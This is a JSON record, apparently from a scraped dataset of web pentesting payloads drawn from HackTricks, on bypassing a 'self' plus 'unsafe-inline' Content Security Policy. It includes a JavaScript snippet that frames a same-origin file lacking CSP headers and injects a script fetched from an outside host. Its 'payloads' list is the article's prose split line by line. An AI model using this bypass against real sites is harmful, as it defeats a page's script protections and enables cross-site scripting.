{
  "id": "pentesting_web_59f1cb86e21f",
  "category": "pentesting-web",
  "title": "csp bypass self + unsafe inline with iframes",
  "description": "# CSP Bypass via Self + Unsafe Inline with Iframes\n\n{{#include ../../banners/hacktricks-training.md}}\n\nA configuration such as:\n\n```\nContent-Security-Policy: default-src 'self' 'unsafe-inline';\n```\n\nProhibits usage of any functions that execute code transmitted as a string. For example: `eval, setTimeout, setInterval` will all be blocked because of the setting `unsafe-eval`\n\nAny content from external sources is also blocked, including images, CSS, WebSockets, and, especially, JS\n\n## Via Text & I",
  "payloads": [
    "# CSP Bypass via Self + Unsafe Inline with Iframes",
    "{{#include ../../banners/hacktricks-training.md}}",
    "A configuration such as:",
    "Content-Security-Policy: default-src 'self' 'unsafe-inline';",
    "Prohibits usage of any functions that execute code transmitted as a string. For example: `eval, setTimeout, setInterval` will all be blocked because of the setting `unsafe-eval`",
    "Any content from external sources is also blocked, including images, CSS, WebSockets, and, especially, JS",
    "## Via Text & Images",
    "It's observed that modern browsers convert images and texts into HTML to enhance their display (e.g., setting backgrounds, centering, etc.). Consequently, if an image or text file, such as `favicon.ico` or `robots.txt`, is opened via an `iframe`, it's rendered as HTML. Notably, these pages often lack CSP headers and may not include X-Frame-Options, enabling the execution of arbitrary JavaScript from them:",
    "```javascript",
    "frame = document.createElement(\"iframe\")",
    "frame.src = \"/css/bootstrap.min.css\"",
    "document.body.appendChild(frame)",
    "script = document.createElement(\"script\")",
    "script.src = \"//example.com/csp.js\"",
    "window.frames[0].document.head.appendChild(script)"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes.md"
  ]
}